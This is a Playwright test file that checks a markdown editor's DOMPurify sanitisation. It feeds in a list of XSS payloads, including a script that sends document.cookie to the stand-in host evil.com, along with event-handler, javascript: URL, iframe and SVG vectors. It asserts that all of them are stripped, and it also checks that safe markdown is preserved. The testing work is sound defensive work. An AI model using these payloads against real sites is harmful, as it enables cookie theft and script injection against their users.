// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2025 Mick Darling

// @ts-check
const { test, expect } = require('@playwright/test');
const {
  waitForPageReady,
  setCodeMirrorContent,
  renderMarkdownAndWait,
  WAIT_TIMES
} = require('./helpers/test-utils');

/**
 * XSS Prevention Tests
 *
 * Verifies that DOMPurify properly sanitizes HTML rendered from markdown,
 * blocking common XSS attack vectors while preserving safe content.
 *
 * Test vectors based on OWASP XSS Prevention Cheat Sheet and common payloads.
 */

/**
 * XSS attack payloads to test against
 * Each payload includes the attack vector, expected sanitized output pattern,
 * and what should NOT be present in the DOM after sanitization
 */
const XSS_PAYLOADS = [
  {
    name: 'script tag',
    markdown: '# Hello\n<script>alert("XSS")</script>',
    shouldNotContain: ['<script', 'alert(']
  },
  {
    name: 'script tag with encoded content',
    markdown: '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
    shouldNotContain: ['<script', 'document.location', 'document.cookie']
  },
  {
    name: 'img onerror handler',
    markdown: '<img src="x" onerror="alert(\'XSS\')">',
    shouldNotContain: ['onerror']
  },
  {
    name: 'img onload handler',
    markdown: '<img src="valid.jpg" onload="alert(\'XSS\')">',
    shouldNotContain: ['onload=']
  },
  {
    name: 'svg onload handler',
    markdown: '<svg onload="alert(\'XSS\')"><circle r="50"/></svg>',
    shouldNotContain: ['onload']
  },
  {
    name: 'body onload handler',
    markdown: '<body onload="alert(\'XSS\')">',
    shouldNotContain: ['<body', 'onload']
  },
  {
    name: 'div onclick handler',
    markdown: '<div onclick="alert(\'XSS\')">Click me</div>',
    shouldNotContain: ['onclick']
  },
  {
    name: 'anchor onmouseover',
    markdown: '<a href="#" onmouseover="alert(\'XSS\')">Hover me</a>',
    shouldNotContain: ['onmouseover']
  },
  {
    name: 'input onfocus',
    markdown: '<input type="text" onfocus="alert(\'XSS\')" autofocus>',
    shouldNotContain: ['onfocus']
  },
  {
    name: 'javascript URL in anchor',
    markdown: '[Click me](javascript:alert("XSS"))',
    shouldNotContain: ['javascript:']
  },
  {
    name: 'javascript URL in img src',
    markdown: '<img src="javascript:alert(\'XSS\')">',
    shouldNotContain: ['javascript:']
  },
  {
    name: 'data URL with script',
    markdown: '<a href="data:text/html,<script>alert(\'XSS\')</script>">Click</a>',
    shouldNotContain: ['data:text/html']
  },
  {
    name: 'iframe injection',
    markdown: '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    shouldNotContain: ['<iframe']
  },
  {
    name: 'iframe with srcdoc',
    markdown: '<iframe srcdoc="<script>alert(\'XSS\')</script>"></iframe>',
    shouldNotContain: ['<iframe', 'srcdoc']
  },
  {
    name: 'object tag',
    markdown: '<object data="javascript:alert(\'XSS\')"></object>',
    shouldNotContain: ['<object']
  },
  {
    name: 'embed tag',
    markdown: '<embed src="javascript:alert(\'XSS\')">',
    shouldNotContain: ['<embed']
  },
  {
    name: 'form action javascript',
    markdown: '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
    shouldNotContain: ['javascript:']
  },
  // Note: 'style with expression' test removed - modern browsers block javascript: in CSS urls
  // and DOMPurify correctly doesn't strip harmless CSS (the url() never executes)
  {
    name: 'meta refresh redirect',
    markdown: '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
    shouldNotContain: ['<meta', 'javascript:']
  },
  {
    name: 'base tag hijack',
    markdown: '<base href="javascript:alert(\'XSS\')//">',
    shouldNotContain: ['<base']
  },
  {
    name: 'link tag stylesheet injection',
    markdown: '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
    shouldNotContain: ['<link']
  },
  {
    name: 'table background javascript',
    markdown: '<table background="javascript:alert(\'XSS\')"><tr><td>test</td></tr></table>',
    shouldNotContain: ['javascript:']
  },
  {
    name: 'marquee tag with handler',
    markdown: '<marquee onstart="alert(\'XSS\')">text</marquee>',
    shouldNotContain: ['onstart']
  },
  {
    name: 'video poster javascript',
    markdown: '<video poster="javascript:alert(\'XSS\')"></video>',
    shouldNotContain: ['javascript:']
  },
  {
    name: 'math tag with handler',
    markdown: '<math><maction actiontype="statusline#http://evil.com" xlink:href="javascript:alert(\'XSS\')">text</maction></math>',
    shouldNotContain: ['javascript:', 'xlink:href']
  },
  // Note: Template literal test removed - ${...} in static HTML is not executed
  // JavaScript template literals only work within JS code, not in innerHTML
  {
    name: 'svg script tag',
    markdown: '<svg><script>alert("XSS")</script></svg>',
    shouldNotContain: ['<script']
  },
  {
    name: 'svg animate with values',
    markdown: '<svg><animate onbegin="alert(\'XSS\')"/></svg>',
    shouldNotContain: ['onbegin']
  },
  {
    name: 'foreignObject in SVG',
    markdown: '<svg><foreignObject><body onload="alert(\'XSS\')"/></foreignObject></svg>',
    shouldNotContain: ['onload']
  }
];

/**
 * Safe content that should be preserved after sanitization
 */
const SAFE_CONTENT = [
  {
    name: 'basic paragraph',
    markdown: 'This is a paragraph.',
    shouldContain: '<p>This is a paragraph.</p>'
  },
  {
    name: 'heading with text',
    markdown: '# My Heading',
    shouldContain: '<h1'
  },
  {
    name: 'safe link',
    markdown: '[Safe Link](https://example.com)',
    shouldContain: 'href="https://example.com"'
  },
  {
    name: 'safe image',
    markdown: '![Alt text](https://example.com/image.png)',
    shouldContain: 'src="https://example.com/image.png"'
  },
  {
    name: 'bold text',
    markdown: '**bold text**',
    shouldContain: '<strong>bold text</strong>'
  },
  {
    name: 'italic text',
    markdown: '*italic text*',
    shouldContain: '<em>italic text</em>'
  },
  {
    name: 'inline code',
    markdown: '`code snippet`',
    shouldContain: '<code>code snippet</code>'
  },
  {
    name: 'blockquote',
    markdown: '> This is a quote',
    shouldContain: '<blockquote>'
  },
  {
    name: 'unordered list',
    markdown: '- Item 1\n- Item 2',
    shouldContain: '<ul>'
  },
  {
    name: 'ordered list',
    markdown: '1. First\n2. Second',
    shouldContain: '<ol>'
  },
  {
    name: 'horizontal rule',
    markdown: '---',
    shouldContain: '<hr'
  },
  {
    name: 'table',
    markdown: '| Header |\n|--------|\n| Cell   |',
    shouldContain: '<table>'
  },
  {
    name: 'code block with class',
    markdown: '```javascript\nconst x = 1;\n```',
    shouldContain: 'class="hljs'
  },
  {
    name: 'mailto link',
    markdown: '[Email](mailto:test@example.com)',
    shouldContain: 'href="mailto:test@example.com"'
  }
];

test.describe('XSS Prevention', () => {
  test.beforeEach(async ({ page }) => {
    await waitForPageReady(page);
  });

  test.describe('Blocks dangerous content', () => {
    for (const { name, markdown, shouldNotContain } of XSS_PAYLOADS) {
      test(`should block XSS via ${name}`, async ({ page }) => {
        // Set malicious content in editor
        await setCodeMirrorContent(page, markdown);

        // Trigger render
        await renderMarkdownAndWait(page, WAIT_TIMES.LONG);

        // Get the rendered HTML from the wrapper
        const wrapperHtml = await page.$eval('#wrapper', el => el.innerHTML.toLowerCase());

        // Verify dangerous content is not present
        for (const forbidden of shouldNotContain) {
          expect(
            wrapperHtml,
            `Expected "${forbidden}" to be stripped from output for ${name}`
          ).not.toContain(forbidden.toLowerCase());
        }
      });
    }
  });

  test.describe('Preserves safe content', () => {
    for (const { name, markdown, shouldContain } of SAFE_CONTENT) {
      test(`should preserve ${name}`, async ({ page }) => {
        // Set safe content in editor
        await setCodeMirrorContent(page, markdown);

        // Trigger render
        await renderMarkdownAndWait(page, WAIT_TIMES.LONG);

        // Get the rendered HTML from the wrapper
        const wrapperHtml = await page.$eval('#wrapper', el => el.innerHTML.toLowerCase());

        // Verify safe content is preserved
        expect(
          wrapperHtml,
          `Expected "${shouldContain}" to be present for ${name}`
        ).toContain(shouldContain.toLowerCase());
      });
    }
  });

  test.describe('Prevents script execution', () => {
    test('should not execute inline script tags', async ({ page }) => {
      // Set up listener for any alerts
      let alertTriggered = false;
      page.on('dialog', async dialog => {
        alertTriggered = true;
        await dialog.dismiss();
      });

      // Set malicious content
      await setCodeMirrorContent(page, '<script>alert("XSS")</script>');
      await renderMarkdownAndWait(page, WAIT_TIMES.LONG);

      // Verify no alert was triggered
      expect(alertTriggered, 'Script should not execute').toBe(false);
    });

    test('should not execute event handlers', async ({ page }) => {
      // Set up listener for any alerts
      let alertTriggered = false;
      page.on('dialog', async dialog => {
        alertTriggered = true;
        await dialog.dismiss();
      });

      // Set content with event handler
      await setCodeMirrorContent(page, '<img src="x" onerror="alert(\'XSS\')">');
      await renderMarkdownAndWait(page, WAIT_TIMES.LONG);

      // Wait a bit for potential script execution
      await page.waitForTimeout(500);

      // Verify no alert was triggered
      expect(alertTriggered, 'Event handler should not execute').toBe(false);
    });

    test('should not execute javascript: URLs on click', async ({ page }) => {
      // Set up listener for any alerts
      let alertTriggered = false;
      page.on('dialog', async dialog => {
        alertTriggered = true;
        await dialog.dismiss();
      });

      // Set content with javascript URL
      await setCodeMirrorContent(page, '<a href="javascript:alert(\'XSS\')" id="xss-link">Click me</a>');
      await renderMarkdownAndWait(page, WAIT_TIMES.LONG);

      // Try to click the link if it exists
      const link = await page.$('#wrapper a');
      if (link) {
        await link.click().catch(() => {
          // Click might fail if href was removed, which is fine
        });
      }

      // Wait a bit for potential script execution
      await page.waitForTimeout(500);

      // Verify no alert was triggered
      expect(alertTriggered, 'javascript: URL should not execute').toBe(false);
    });
  });

  test.describe('DOMPurify availability', () => {
    test('should have DOMPurify loaded globally', async ({ page }) => {
      const hasDOMPurify = await page.evaluate(() => {
        return typeof DOMPurify !== 'undefined' && typeof DOMPurify.sanitize === 'function';
      });

      expect(hasDOMPurify, 'DOMPurify should be available').toBe(true);
    });

    test('should sanitize HTML through DOMPurify.sanitize', async ({ page }) => {
      // Test DOMPurify directly
      const result = await page.evaluate(() => {
        const dirty = '<script>alert("XSS")</script><p>Safe</p>';
        const clean = DOMPurify.sanitize(dirty);
        return {
          hasScript: clean.includes('<script'),
          hasParagraph: clean.includes('<p>Safe</p>')
        };
      });

      expect(result.hasScript, 'Script tag should be removed').toBe(false);
      expect(result.hasParagraph, 'Safe paragraph should be preserved').toBe(true);
    });
  });

  test.describe('Attribute preservation', () => {
    test('should preserve class attributes for syntax highlighting', async ({ page }) => {
      await setCodeMirrorContent(page, '```python\nprint("hello")\n```');
      await renderMarkdownAndWait(page, WAIT_TIMES.LONG);

      const hasClass = await page.$eval('#wrapper', el => {
        const code = el.querySelector('code');
        return code && code.classList.length > 0;
      });

      expect(hasClass, 'Code blocks should have class attributes').toBe(true);
    });

    test('should preserve id attributes for anchor links', async ({ page }) => {
      await setCodeMirrorContent(page, '# Test Heading');
      await renderMarkdownAndWait(page, WAIT_TIMES.LONG);

      const hasId = await page.$eval('#wrapper', el => {
        const h1 = el.querySelector('h1');
        return h1 && h1.hasAttribute('id');
      });

      expect(hasId, 'Headings should have id attributes').toBe(true);
    });
  });
});
